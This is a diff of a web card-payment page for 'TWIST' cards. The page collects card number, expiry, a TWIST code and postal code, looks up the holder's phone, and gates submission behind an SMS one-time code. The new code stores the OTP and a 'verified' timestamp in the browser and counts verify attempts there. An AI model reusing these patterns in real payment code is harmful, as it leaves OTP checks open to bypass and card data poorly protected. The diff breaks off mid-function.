@@ -5,52 +5,107 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>TWIST Card Payment</title>
 <style>
-  :root { --brand:#f97316; --bg:#ffffff; --muted:#6b7280; --ok:#16a34a; --bad:#dc2626; }
-  body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background:#fff; padding: 1.5rem; color:#111827; }
-  .form-wrapper { max-width: 540px; margin: auto; padding-top:.25rem; }
-  .form-container { background:#fff; padding: 1.25rem; border-radius: 12px; border:1px solid #e5e7eb; box-shadow: 0 10px 30px rgba(17,24,39,.08); position: relative; overflow: hidden; }
-  .form-group { margin-bottom: 1rem; min-width:0; }
-  label { font-weight: 600; display: flex; align-items:center; gap:.4rem; margin-bottom: 0.35rem; }
-  input { width: 100%; max-width:100%; min-width:0; padding: .65rem .7rem; font-size: 1rem; border-radius: 8px; border: 1px solid #cfcfcf; outline: none; background:#fff; }
-  input:focus { border-color: var(--brand); box-shadow: 0 0 0 4px rgba(249,115,22,.2); }
-  .row { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: .75rem; }
-  button { background: linear-gradient(180deg,var(--brand),#ea580c); color: #fff; border: 0; padding: .8rem 1.1rem; border-radius: 8px; cursor: pointer; font-weight: 800; max-width:100%; }
-  button[disabled] { opacity: .6; cursor: not-allowed; }
-  .muted { color: var(--muted); font-size: .92rem; }
-  .notice { background:#fff; border:1px solid #fde68a; color:#854d0e; padding:.9rem; border-radius:8px; margin-bottom:1rem; }
-  .hidden { display: none; }
-  .spinner { width: 44px; height: 44px; border: 4px solid #e5e7eb; border-top: 4px solid var(--brand); border-radius: 50%; animation: spin 1s linear infinite; margin: 1rem auto; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .ok { color: var(--ok); font-weight: 700; }
-  .bad { color: var(--bad); font-weight: 700; }
-
-  .btn-inline { display:flex; gap:.5rem; align-items:stretch; flex-wrap:wrap; }
-  .btn-inline input { flex:1 1 0%; min-width:0; }
-  .btn-inline button { flex:0 0 auto; background:#6b7280; background-image:none; box-shadow:none !important; white-space:nowrap; } /* no shadows for OTP buttons */
-
-  #submitBtn { text-transform: uppercase; letter-spacing:.04em; }
-  .err { background:#fff1f2; border:1px solid #fecdd3; color:#be123c; padding:.6rem .75rem; border-radius:8px; overflow-wrap:anywhere; }
-
-  #orderDetails { background:#fff; border:1px solid #e5e7eb; padding:.75rem .9rem; border-radius:12px; box-shadow:none; }
-  form fieldset { background:#fff; border:1px solid #e5e7eb !important; border-radius:12px !important; }
-
-  /* Info icon + modal */
-  .info-icon{
-    display:inline-flex; align-items:center; justify-content:center;
-    width:18px; height:18px; border-radius:999px;
-    background:#7c3aed; color:#fff; font-size:12px; font-weight:800; line-height:1;
-    border:none; cursor:pointer;
+  :root{
+    --brand:#f97316; --brand-600:#ea580c; --brand-700:#c2410c;
+    --muted:#6b7280; --ok:#16a34a; --bad:#dc2626; --border:#e5e7eb;
+    --ring:rgba(249,115,22,.28);
+    --btn-gray:#6b7280; --btn-gray-700:#4b5563;
+    --purple:#7c3aed;
   }
-  .modal{ position:fixed; inset:0; background:rgba(0,0,0,.45); display:flex; align-items:center; justify-content:center; z-index:9999; }
-  .modal.hidden{ display:none !important; }
-  .modal .box{ background:#fff; color:#111827; padding:1rem 1.1rem; border-radius:12px; max-width:320px; box-shadow:0 10px 30px rgba(0,0,0,.2); text-align:center; }
-  .modal .box button{ margin-top:.75rem; }
+  /* Page + general */
+  html,body{ height:100%; }
+  body{
+    margin:0; padding:1.5rem; background:#fff; color:#111827;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; text-rendering:optimizeLegibility;
+  }
+  .form-wrapper{ max-width:540px; margin:auto; padding-top:.25rem; }
+  .form-wrapper h2{ font-weight:800; letter-spacing:-.02em; margin:0 0 .5rem; }
+  #orderDetails{
+    background:#fff; border:1px solid var(--border); border-radius:12px;
+    padding:.75rem .9rem;
+  }
 
-  /* Anti-overflow hardening */
-  *, *::before, *::after { box-sizing: border-box; }
-  html, body { overflow-x: hidden; }
-  .form-wrapper, .form-container, form, fieldset { max-width:100%; }
-  img { max-width:100%; height:auto; }
+  /* Card container */
+  .form-container{
+    background:#fff; border:1px solid var(--border); border-radius:16px;
+    padding:1.25rem; box-shadow:none; /* no background effects */
+    position:relative; overflow:hidden;
+  }
+
+  /* Grid & inputs */
+  .row{ display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:.9rem; }
+  .row3{ display:grid; grid-template-columns:repeat(3,minmax(0,1fr)); gap:.9rem; }
+  .form-group{ margin-bottom:1rem; min-width:0; }
+  label{ font-weight:600; display:flex; align-items:center; gap:.4rem; margin-bottom:.35rem; font-size:.95rem; color:#374151; }
+  input,button{ min-width:0; box-sizing:border-box; }
+  input{
+    width:100%; padding:.65rem .7rem; font-size:16px; line-height:1.25rem;
+    border-radius:10px; border:1px solid #d1d5db; outline:none; background:#fff;
+    transition:border-color .15s ease, box-shadow .15s ease, transform .06s ease;
+  }
+  input:hover{ border-color:#cbd5e1; }
+  input:focus{ border-color:var(--brand); box-shadow:0 0 0 4px var(--ring); transform:translateY(-1px); }
+  input::placeholder{ color:#9ca3af; }
+
+  /* Buttons */
+  button{
+    background:linear-gradient(180deg,var(--brand),var(--brand-600));
+    color:#fff; border:none; border-radius:10px; font-size:15px; font-weight:800;
+    padding:.8rem 1.1rem; cursor:pointer; transition:transform .08s ease, filter .12s ease;
+  }
+  button:hover{ transform:translateY(-1px); filter:brightness(1.02); }
+  button:active{ transform:translateY(0); }
+  button[disabled]{ opacity:.6; cursor:not-allowed; filter:grayscale(.1) brightness(.95); }
+
+  /* OTP inline controls */
+  .btn-inline{ display:flex; gap:.5rem; align-items:stretch; }
+  .btn-inline input{ flex:1 1 auto; min-width:0; }
+  .btn-inline button{ flex:0 0 auto; box-shadow:none !important; } /* no shadows on OTP buttons */
+
+  /* Secondary (gray) buttons like SEND OTP & VERIFY OTP */
+  .btn-secondary{
+    background:linear-gradient(180deg,var(--btn-gray),var(--btn-gray-700)) !important;
+  }
+
+  .muted{ color:var(--muted); font-size:.92rem; }
+  .notice{
+    border:1px solid #fde68a; background:#fffbeb; color:#854d0e;
+    padding:.9rem; border-radius:8px; margin-bottom:1rem;
+  }
+  .hidden{ display:none !important; }
+  .spinner{ width:44px; height:44px; border:4px solid #e5e7eb; border-top:4px solid var(--brand); border-radius:50%; animation:spin 1s linear infinite; margin:1rem auto; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .ok{ color:#059669; font-weight:700; }
+  .bad{ color:#dc2626; font-weight:700; }
+  .err{
+    background:#fff1f2; border:1px solid #fecdd3; color:#be123c;
+    padding:.6rem .75rem; border-radius:8px; margin-top:.5rem;
+  }
+
+  /* Info icon (TWIST) */
+  .info-btn{
+    all:unset; display:inline-flex; align-items:center; justify-content:center;
+    width:18px; height:18px; border-radius:50%; background:var(--purple); color:#fff;
+    font-size:.8rem; line-height:1; cursor:pointer;
+  }
+
+  /* Dialog */
+  .dialog-backdrop{
+    position:fixed; inset:0; background:rgba(0,0,0,.4); display:flex; align-items:center; justify-content:center; z-index:50;
+  }
+  .dialog{
+    background:#fff; border:1px solid var(--border); border-radius:12px; padding:1rem; max-width:420px; width:92%;
+  }
+
+  /* Mobile */
+  @media (max-width:640px){
+    .row,.row3{ grid-template-columns:1fr; }
+    .form-container{ padding:1rem; }
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{ transition:none !important; animation:none !important; }
+  }
 </style>
 </head>
 <body>
@@ -69,8 +124,21 @@
       To pay with your card, click on the link provided in your order confirmation.
     </div>
 
+    <!-- TWIST info dialog -->
+    <div id="twistDialogWrap" class="dialog-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="twistDialogTitle">
+      <div class="dialog">
+        <h3 id="twistDialogTitle" style="margin:.2rem 0 .6rem; font-weight:800;">About your TWIST Code</h3>
+        <p class="muted" style="margin:0 0 .9rem;">
+          You will find your 4 digits code in the <strong>TWIST Code</strong> section of the APP.
+        </p>
+        <div style="text-align:right;">
+          <button type="button" id="twistDialogOk">OK</button>
+        </div>
+      </div>
+    </div>
+
     <form id="paymentForm" autocomplete="off" novalidate>
-      <fieldset style="padding:1rem; border-radius:10px; margin-bottom:1rem;">
+      <fieldset style="background:#fff; padding:1rem; border:1px solid var(--border); border-radius:10px; margin-bottom:1rem;">
         <div class="form-group">
           <label for="orderno">Order Number</label>
           <input type="text" id="orderno" readonly aria-readonly="true">
@@ -92,12 +160,12 @@
           <input type="text" id="expiration" placeholder="MMYY" inputmode="numeric" required>
         </div>
         <div class="form-group">
-          <label for="twist">TWIST Code (XXXX)
-            <button type="button" id="twistInfoBtn" class="info-icon" aria-haspopup="dialog" aria-controls="twistInfo" aria-label="Where to find your TWIST code">i</button>
-          </label>
+          <label for="twist">TWIST Code (XXXX) <button type="button" class="info-btn" id="twistInfoBtn" aria-label="What is TWIST code?">i</button></label>
           <input type="text" id="twist" maxlength="4" inputmode="numeric" required>
         </div>
       </div>
+
+      <!-- Removed Address/City/Province per your request -->
 
       <div class="form-group">
         <label for="postal">Postal Code</label>
@@ -114,43 +182,39 @@
         <input type="email" id="email" required autocomplete="email">
       </div>
 
-      <!-- OTP Prefill Mode -->
-      <div class="form-group hidden" id="otpPrefillGroup">
-        <label id="sendOtpLabel" style="font-weight:800; text-transform:uppercase;">SEND A CODE TO PHONE ENDING WITH ••••</label>
-        <div class="btn-inline">
-          <!-- hidden readonly phone holder (kept for logic) -->
-          <input type="text" id="otpPhone" readonly class="hidden" />
-          <button type="button" id="sendOtpBtn">Send</button>
+      <!-- OTP SECTION (hidden until VERIFY PAYMENT succeeds) -->
+      <div id="otpSection" class="hidden">
+        <div class="form-group">
+          <label id="sendOtpLabel" class="muted">Send a code to phone ending with ••••</label>
+          <div class="btn-inline">
+            <button type="button" id="sendOtpBtn" class="btn-secondary">Send OTP</button>
+            <div id="resendTimer" class="muted" style="align-self:center;"></div>
+          </div>
+          <div id="sendOtpNote" class="muted" style="margin-top:.35rem;"></div>
         </div>
-        <div id="sendOtpNote" class="muted"></div>
+
+        <div class="form-group">
+          <label for="otpCode">Enter OTP</label>
+          <div class="btn-inline">
+            <input type="text" id="otpCode" inputmode="numeric" placeholder="6-digit code">
+            <button type="button" id="verifyOtpBtn" class="btn-secondary">Verify OTP</button>
+          </div>
+          <div id="otpStatus" class="muted" style="margin-top:.5rem; font-weight:700;"></div>
+        </div>
       </div>
 
-      <!-- OTP Manual Fallback (shown only if prefill fails) -->
-      <div class="form-group hidden" id="otpManualGroup">
-        <label for="otpPhoneManual">Phone (+1XXXXXXXXXX)</label>
-        <div class="btn-inline">
-          <input type="text" id="otpPhoneManual" autocomplete="tel" placeholder="+1##########">
-          <button type="button" id="sendOtpBtnManual">Send OTP</button>
-        </div>
-        <div id="sendOtpNoteManual" class="muted"></div>
+      <div id="clientErr" class="err hidden"></div>
+
+      <!-- Primary actions -->
+      <div class="btn-inline" style="margin-top:.25rem;">
+        <button type="button" id="verifyPaymentBtn">Verify Payment</button>
+        <button type="submit" id="submitBtn" disabled>Submit Payment</button>
       </div>
 
-      <div class="form-group">
-        <label for="otpCode">Enter OTP</label>
-        <div class="btn-inline">
-          <input type="text" id="otpCode" required inputmode="numeric" placeholder="6-digit code" maxlength="6">
-          <button type="button" id="verifyOtpBtn">Verify OTP</button>
-        </div>
-        <div id="otpStatus" class="muted" style="margin-top:.5rem; font-weight:700;" aria-live="polite"></div>
-      </div>
-
-      <button type="submit" id="submitBtn" disabled>Submit Payment</button>
       <div id="loadingSpinner" class="hidden" style="text-align:center; margin-top: 1rem;">
         <div class="spinner" aria-hidden="true"></div>
         <p>Processing your payment...</p>
       </div>
-
-      <div id="clientErr" class="err hidden" role="alert" aria-live="assertive"></div>
     </form>
 
     <div id="confirmationStep" class="hidden" style="text-align:center;">
@@ -171,29 +235,37 @@
   </div>
 </div>
 
-<!-- Info Modal -->
-<div id="twistInfo" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="twistInfoTitle">
-  <div class="box">
-    <div id="twistInfoTitle" style="font-weight:700;margin-bottom:.25rem;">TWIST Code</div>
-    <p>You will find your 4 digits code in the TWIST Code section of the APP</p>
-    <button type="button" id="twistInfoClose">OK</button>
-  </div>
-</div>
-
 <script>
   /* ------------ URL params + FALLBACKS ------------ */
   const LS_KEYS = {
-    orderno:'twistpay:lastOrderno',
-    amount:'twistpay:lastAmount',
-    email:'twistpay:lastEmail',
-    otpPhone:'twistpay:lastOtpPhone',
+    orderno: 'twistpay:lastOrderno',
+    amount:  'twistpay:lastAmount',
+    email:   'twistpay:lastEmail',
   };
-  const COOLDOWN_SECONDS = 60;
+  const OTP_PHONE_KEY = 'twistpay:lastOtpPhone';
+  const OTP_CODE_KEY  = 'twistpay:lastOtpCode';     // to persist "verified" and reuse on refresh
+  const OTP_VF_TS_KEY = 'twistpay:otpVerifiedTs';   // timestamp of last verification
+  const OTP_ATTEMPTS_PREFIX = 'twistpay:otpAttempts:'; // + last10
+
+  const OTP_TTL_MS = 10 * 60 * 1000;  // 10 minutes (aligns with server cache)
+  const RESEND_SECONDS = 45;
   const MAX_VERIFY_ATTEMPTS = 5;
 
-  function setField(id, val) { if (typeof val !== 'string' || !val.length) return; const el = document.getElementById(id); if (el) el.value = val; }
-  function parseParams(url){ try { return new URL(url).searchParams; } catch { return new URLSearchParams(''); } }
-  function pickFrom(sp){ return { amount: sp.get('t_amount')||sp.get('amount')||'', orderno: sp.get('t_orderno')||sp.get('orderno')||'', email: sp.get('t_email')||sp.get('email')||'' }; }
+  function setField(id, val) {
+    if (typeof val !== 'string' || !val.length) return;
+    const el = document.getElementById(id);
+    if (el) el.value = val;
+  }
+  function parseParams(url) {
+    try { return new URL(url).searchParams; } catch { return new URLSearchParams(''); }
+  }
+  function pickFrom(sp) {
+    return {
+      amount:  sp.get('t_amount')  || sp.get('amount')  || '',
+      orderno: sp.get('t_orderno') || sp.get('orderno') || '',
+      email:   sp.get('t_email')   || sp.get('email')   || ''
+    };
+  }
   (function initPrefill() {
     const isFramed = (window.top !== window.self);
     const childQP = new URLSearchParams(window.location.search);
@@ -201,18 +273,24 @@
     if (isFramed && (!vals.amount || !vals.orderno || !vals.email)) {
       const parentQP = parseParams(document.referrer || '');
       const fromParent = pickFrom(parentQP);
-      vals = { amount: vals.amount || fromParent.amount, orderno: vals.orderno || fromParent.orderno, email: vals.email || fromParent.email };
+      vals = {
+        amount:  vals.amount  || fromParent.amount,
+        orderno: vals.orderno || fromParent.orderno,
+        email:   vals.email   || fromParent.email
+      };
     }
     if (!vals.amount)  vals.amount  = localStorage.getItem(LS_KEYS.amount)  || '';
     if (!vals.orderno) vals.orderno = localStorage.getItem(LS_KEYS.orderno) || '';
     if (!vals.email)   vals.email   = localStorage.getItem(LS_KEYS.email)   || '';
-    const amt = String(vals.amount||'').replace(/^\$/, '');
-    setField('amount',  amt);
+
+    setField('amount',  vals.amount);
     setField('orderno', vals.orderno);
     setField('email',   vals.email);
+
     if (!vals.orderno || !vals.amount) document.getElementById('autoFillNotice').classList.remove('hidden');
+
     document.getElementById('orderDetails').innerHTML =
-      `Order Number: <strong>${vals.orderno || '-'}</strong><br>Total: <strong>$${amt || '-'}</strong>`;
+      `Order Number: <strong>${vals.orderno || '-'}</strong><br>Total: <strong>$${vals.amount || '-'}</strong>`;
   })();
 
   function persistBasics({ amount, orderno, email }) {
@@ -227,339 +305,242 @@
     const last10 = digits.slice(-10);
     return last10.length === 10 ? `+1${last10}` : null;
   }
-  function provinceFromPostal(postal){
-    const s = String(postal||'').toUpperCase().replace(/\s+/g,'');
-    const f = s.charAt(0), tri = s.slice(0,3);
-    if (f==='A') return 'NL';
-    if (f==='B') return 'NS';
-    if (f==='C') return 'PE';
-    if (f==='E') return 'NB';
-    if (f==='G'||f==='H'||f==='J') return 'QC';
-    if (f==='K'||f==='L'||f==='M'||f==='N'||f==='P') return 'ON';
-    if (f==='R') return 'MB';
-    if (f==='S') return 'SK';
-    if (f==='T') return 'AB';
-    if (f==='V') return 'BC';
-    if (f==='X') return /^X0[ABC]/.test(tri) ? 'NU' : 'NT';
-    if (f==='Y') return 'YT';
-    return '';
-  }
-  function last4(p){ return (p||'').slice(-4); }
-
-  /* ------------ Inputs ------------ */
-  const cardEl   = document.getElementById('cardNumber');
-  const expEl    = document.getElementById('expiration');
-  const twistEl  = document.getElementById('twist');
-  const postalEl = document.getElementById('postal');
-
-  const otpPrefillGroup  = document.getElementById('otpPrefillGroup');
-  const sendOtpLabel     = document.getElementById('sendOtpLabel');
-  const otpPhoneHiddenEl = document.getElementById('otpPhone'); // hidden holder when derived
-
-  const otpManualGroup   = document.getElementById('otpManualGroup');
-  const otpPhoneManualEl = document.getElementById('otpPhoneManual');
-
-  const sendOtpBtn       = document.getElementById('sendOtpBtn');
-  const sendOtpNote      = document.getElementById('sendOtpNote');
-  const sendOtpBtnManual = document.getElementById('sendOtpBtnManual');
-  const sendOtpNoteManual= document.getElementById('sendOtpNoteManual');
-
-  const otpEl       = document.getElementById('otpCode');
-  const verifyOtpBtn= document.getElementById('verifyOtpBtn');
-  const otpStatus   = document.getElementById('otpStatus');
-  const submitBtn   = document.getElementById('submitBtn');
-  const clientErr   = document.getElementById('clientErr');
-
-  /* Masks */
-  cardEl.addEventListener('input', function () {
-    let v = this.value.replace(/\D/g, '');
-    if (v.length > 14) v = v.slice(0, 14);
-    this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
-    resetOtpState();
-    maybeDerivePhone();
-  });
-  expEl.addEventListener('input', function () {
-    let v = this.value.replace(/\D/g, '');
-    this.value = v.slice(0, 4);
-    resetOtpState();
-    maybeDerivePhone();
-  });
-  twistEl.addEventListener('input', function () {
-    this.value = this.value.replace(/\D/g, '').slice(0, 4);
-    resetOtpState();
-    maybeDerivePhone();
-  });
-  postalEl.addEventListener('input', () => {
-    postalEl.value = postalEl.value.toUpperCase();
-    resetOtpState();
-    maybeDerivePhone();
-  });
-  otpEl.addEventListener('input', () => {
-    otpEl.value = otpEl.value.replace(/\D/g, '').slice(0, 6);
-    verifyOtpBtn.disabled = otpEl.value.length !== 6 || isVerifyLocked(currentPhone());
-  });
-
-  /* ------------ Modal controls ------------ */
-  const infoBtn = document.getElementById('twistInfoBtn');
-  const infoModal = document.getElementById('twistInfo');
-  const infoClose = document.getElementById('twistInfoClose');
-  infoBtn.addEventListener('click', () => infoModal.classList.remove('hidden'));
-  infoClose.addEventListener('click', () => infoModal.classList.add('hidden'));
-  infoModal.addEventListener('click', (e) => { if (e.target === infoModal) infoModal.classList.add('hidden'); });
-
-  /* ------------ OTP state helpers ------------ */
-  function currentPhone(){
-    return otpPrefillGroup.classList.contains('hidden')
-      ? normalizePhoneToE164_CA(otpPhoneManualEl.value)
-      : otpPhoneHiddenEl.value || null;
-  }
-  function cooldownKey(phone){ return `twistpay:otpCooldown:${phone}`; }
-  function attemptsKey(phone){ return `twistpay:verifyAttempts:${phone}`; }
-  function verifiedKey(phone){ return `twistpay:otpVerified:${phone}`; }
-
-  function isVerifyLocked(phone){
-    if (!phone) return false;
-    const n = parseInt(localStorage.getItem(attemptsKey(phone)||'0'),10) || 0;
-    return n >= MAX_VERIFY_ATTEMPTS;
-  }
-
-  function resetOtpState(){
-    otpStatus.textContent = '';
-    otpEl.value = '';
-    verifyOtpBtn.disabled = true;
-    submitBtn.disabled = true;
-    // don’t clear verified flag automatically; it’s tied to phone and will be checked after re-derive
-  }
+  const last4 = (p) => (String(p||'').replace(/\D/g,'').slice(-4));
 
   function showErr(msg) {
+    const clientErr = document.getElementById('clientErr');
     clientErr.textContent = msg;
     clientErr.classList.remove('hidden');
     setTimeout(() => clientErr.classList.add('hidden'), 5000);
   }
 
-  /* ------------ Derive phone (server) ------------ */
-  let deriving = false, lastDeriveSig = '';
-  async function maybeDerivePhone(){
+  /* ------------ Masks / inputs ------------ */
+  const cardEl = document.getElementById('cardNumber');
+  const expEl = document.getElementById('expiration');
+  const twistEl = document.getElementById('twist');
+  const postalEl = document.getElementById('postal');
+  const nameEl = document.getElementById('name');
+  const emailEl = document.getElementById('email');
+
+  const otpSection = document.getElementById('otpSection');
+  const sendOtpBtn = document.getElementById('sendOtpBtn');
+  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+  const sendOtpLabel = document.getElementById('sendOtpLabel');
+  const resendTimerEl = document.getElementById('resendTimer');
+  const sendOtpNote = document.getElementById('sendOtpNote');
+  const otpEl = document.getElementById('otpCode');
+  const otpStatus = document.getElementById('otpStatus');
+  const verifyPaymentBtn = document.getElementById('verifyPaymentBtn');
+  const submitBtn = document.getElementById('submitBtn');
+
+  cardEl.addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '');
+    if (v.length > 14) v = v.slice(0, 14);
+    this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+  });
+  expEl.addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '');
+    this.value = v.slice(0, 4);
+  });
+  twistEl.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+  });
+  otpEl.addEventListener('input', () => {
+    otpEl.value = otpEl.value.replace(/\D/g, '').slice(0, 6);
+  });
+
+  /* ------------ TWIST info dialog ------------ */
+  const infoBtn = document.getElementById('twistInfoBtn');
+  const dlgWrap = document.getElementById('twistDialogWrap');
+  const dlgOk = document.getElementById('twistDialogOk');
+  infoBtn.addEventListener('click', ()=> dlgWrap.classList.remove('hidden'));
+  dlgOk.addEventListener('click', ()=> dlgWrap.classList.add('hidden'));
+
+  /* ------------ OTP cooldown + attempts + persistence ------------ */
+  let cooldownTimer = null;
+  function startCooldown(seconds=RESEND_SECONDS){
+    let remain = seconds;
+    sendOtpBtn.disabled = true;
+    resendTimerEl.textContent = `Resend available in ${remain}s`;
+    cooldownTimer = setInterval(()=>{
+      remain--;
+      if (remain <= 0) {
+        clearInterval(cooldownTimer);
+        resendTimerEl.textContent = '';
+        sendOtpBtn.disabled = false;
+      } else {
+        resendTimerEl.textContent = `Resend available in ${remain}s`;
+      }
+    }, 1000);
+  }
+  function attemptsKeyForPhone(phone){
+    const l10 = String(phone||'').replace(/\D/g,'').slice(-10);
+    return OTP_ATTEMPTS_PREFIX + l10;
+  }
+  function getAttempts(phone){
+    const k = attemptsKeyForPhone(phone);
+    return Number(localStorage.getItem(k) || 0);
+  }
+  function incAttempts(phone){
+    const k = attemptsKeyForPhone(phone);
+    const v = getAttempts(phone) + 1;
+    localStorage.setItem(k, String(v));
+    return v;
+  }
+  function resetAttempts(phone){
+    const k = attemptsKeyForPhone(phone);
+    localStorage.removeItem(k);
+  }
+  function markVerified(phone, code){
+    localStorage.setItem(OTP_PHONE_KEY, phone);
+    localStorage.setItem(OTP_CODE_KEY, String(code||''));
+    localStorage.setItem(OTP_VF_TS_KEY, String(Date.now()));
+  }
+  function isVerifiedFresh(){
+    const ts = Number(localStorage.getItem(OTP_VF_TS_KEY) || 0);
+    return !!ts && (Date.now() - ts) < OTP_TTL_MS;
+  }
+
+  /* ------------ VERIFY PAYMENT (pre-OTP) → derive phone ------------ */
+  verifyPaymentBtn.onclick = async () => {
+    // Basic client checks for fields used by /otp/derive-phone
     const rawCard = cardEl.value.replace(/\s/g, '');
     const exp = expEl.value.replace(/\D/g, '');
     const twist = twistEl.value.replace(/\D/g, '');
     const postal = postalEl.value.trim();
+    if (!/^\d{14}$/.test(rawCard) || !rawCard.startsWith('71461567')) return showErr('Incorrect Card Number');
+    if (!/^\d{4}$/.test(exp)) return showErr('Expiration must be MMYY.');
+    if (!/^\d{4}$/.test(twist)) return showErr('TWIST Code must be 4 digits.');
+    if (!postal) return showErr('Postal code required.');
 
-    if (!/^\d{14}$/.test(rawCard)) return;
-    if (!rawCard.startsWith('71461567')) return;
-    if (!/^\d{4}$/.test(exp)) return;
-    if (!/^\d{4}$/.test(twist)) return;
-    if (!postal) return;
-
-    const sig = `${rawCard}|${exp}|${twist}|${postal}`;
-    if (deriving || sig === lastDeriveSig) return;
-    deriving = true;
-
-    try {
-      const resp = await fetch('https://twist-status-server.onrender.com/otp/derive-phone', {
+    verifyPaymentBtn.disabled = true;
+    verifyPaymentBtn.textContent = 'Verifying...';
+    try{
+      const res = await fetch('/otp/derive-phone', {
         method:'POST', headers:{'Content-Type':'application/json'},
         body: JSON.stringify({ cardNumber: rawCard, expiration: exp, twist, postal })
       });
-      const data = await resp.json().catch(()=> ({}));
-
-      if (resp.ok && data && data.success && data.phone) {
-        lastDeriveSig = sig;
-        const phone = data.phone; // expect "+1XXXXXXXXXX"
-        otpPhoneHiddenEl.value = phone;
-        localStorage.setItem(LS_KEYS.otpPhone, phone);
-
-        // Switch to prefill UI
-        otpManualGroup.classList.add('hidden');
-        otpPrefillGroup.classList.remove('hidden');
-        sendOtpLabel.textContent = `SEND A CODE TO PHONE ENDING WITH ${last4(phone)}`;
-
-        // Restore state (verified or cooldown) if any
-        restoreVerifiedOrCooldown(phone);
-
-      } else {
-        // Fallback to manual if not available
-        otpPrefillGroup.classList.add('hidden');
-        otpManualGroup.classList.remove('hidden');
+      const data = await res.json();
+      if (!res.ok || !data?.success) {
+        throw new Error(data?.message || 'Unable to verify payment info.');
       }
-    } catch (e) {
-      // Network issue → fallback to manual
-      otpPrefillGroup.classList.add('hidden');
-      otpManualGroup.classList.remove('hidden');
-    } finally {
-      deriving = false;
-    }
-  }
+      const phone = data.phone;
+      localStorage.setItem(OTP_PHONE_KEY, phone);
 
-  function restoreVerifiedOrCooldown(phone){
-    // Verified?
-    if (localStorage.getItem(verifiedKey(phone)) === '1') {
-      otpStatus.textContent = '✅ OTP verified!';
-      submitBtn.disabled = false;
-      verifyOtpBtn.disabled = true;
-      // Disallow re-sending for a verified session
-      if (!otpPrefillGroup.classList.contains('hidden')) {
-        sendOtpBtn.disabled = true;
-        sendOtpNote.textContent = 'Phone verified for this session.';
+      // Reveal OTP section
+      sendOtpLabel.textContent = `Send a code to phone ending with ${last4(phone)}`;
+      otpSection.classList.remove('hidden');
+      sendOtpBtn.disabled = false;
+      sendOtpNote.textContent = '';
+      otpStatus.textContent = '';
+
+      // If we still have a fresh verification in the last 10 minutes, enable Submit immediately
+      if (isVerifiedFresh()) {
+        submitBtn.disabled = false;
+        const prevCode = localStorage.getItem(OTP_CODE_KEY) || '';
+        if (prevCode) otpEl.value = prevCode; // keep it so /pre-validate has the code
+        otpStatus.textContent = '✅ OTP previously verified (still valid).';
+        otpStatus.style.color = 'green';
       } else {
-        sendOtpBtnManual.disabled = true;
-        sendOtpNoteManual.textContent = 'Phone verified for this session.';
+        submitBtn.disabled = true;
+        otpEl.value = '';
       }
-      return;
+    }catch(e){
+      showErr(e.message);
+    }finally{
+      verifyPaymentBtn.disabled = false;
+      verifyPaymentBtn.textContent = 'Verify Payment';
     }
+  };
 
-    // Resume cooldown if active
-    const endsAt = parseInt(localStorage.getItem(cooldownKey(phone)||'0'),10) || 0;
-    const now = Date.now();
-    if (endsAt > now) {
-      startCooldownCountdown(phone, Math.ceil((endsAt - now)/1000));
-    }
-  }
-
-  /* ------------ Send OTP (prefill + manual) ------------ */
-  function bindSendHandlers(){
-    sendOtpBtn.onclick = async () => {
-      const phone = otpPhoneHiddenEl.value;
-      if (!phone) return alert('Phone is not ready yet.');
-      await sendOtpTo(phone, sendOtpBtn, sendOtpNote);
-    };
-    sendOtpBtnManual.onclick = async () => {
-      const phone = normalizePhoneToE164_CA(otpPhoneManualEl.value);
-      if (!phone) return alert("Enter a valid Canadian number (e.g., +14165551234).");
-      await sendOtpTo(phone, sendOtpBtnManual, sendOtpNoteManual);
-    };
-  }
-  bindSendHandlers();
-
-  async function sendOtpTo(phone, btn, noteEl){
-    // reset verify attempts for this phone
-    localStorage.setItem(attemptsKey(phone), '0');
-
-    btn.disabled = true;
-    noteEl.textContent = 'Sending...';
-
-    try {
+  /* ------------ SEND OTP (after Verify Payment) ------------ */
+  sendOtpBtn.onclick = async () => {
+    const phone = localStorage.getItem(OTP_PHONE_KEY);
+    if (!phone) return showErr('Please verify payment first.');
+    sendOtpBtn.disabled = true;
+    sendOtpNote.textContent = 'Sending...';
+    try{
       const res = await fetch('https://twilio-otp-server.onrender.com/send-otp', {
         method:'POST', headers:{'Content-Type':'application/json'},
         body: JSON.stringify({ phone })
       });
       const data = await res.json();
       if (data.success) {
-        noteEl.textContent = 'OTP sent.';
-        // lock to that phone
-        if (otpPrefillGroup.classList.contains('hidden')) {
-          otpPhoneManualEl.value = phone;
-        } else {
-          otpPhoneHiddenEl.value = phone;
-        }
-        localStorage.setItem(LS_KEYS.otpPhone, phone);
-        // start cooldown
-        startCooldownCountdown(phone);
-        // allow verify now that code is sent
-        verifyOtpBtn.disabled = (otpEl.value.length !== 6);
+        sendOtpNote.textContent = `Code sent to phone ending with ${last4(phone)}.`;
+        startCooldown();
       } else {
-        noteEl.textContent = `Error: ${data.error || 'Unknown error'}`;
-        btn.disabled = false;
+        sendOtpNote.textContent = 'Error sending OTP: ' + (data.error || 'Unknown error');
+        sendOtpBtn.disabled = false;
       }
-    } catch (e) {
-      noteEl.textContent = `Network error: ${e.message}`;
-      btn.disabled = false;
+    }catch(e){
+      sendOtpNote.textContent = 'Network error: ' + e.message;
+      sendOtpBtn.disabled = false;
     }
-  }
+  };
 
-  function startCooldownCountdown(phone, startFrom = COOLDOWN_SECONDS){
-    const endsAt = Date.now() + startFrom*1000;
-    localStorage.setItem(cooldownKey(phone), String(endsAt));
-
-    const isPrefill = !otpPrefillGroup.classList.contains('hidden') || !!otpPhoneHiddenEl.value;
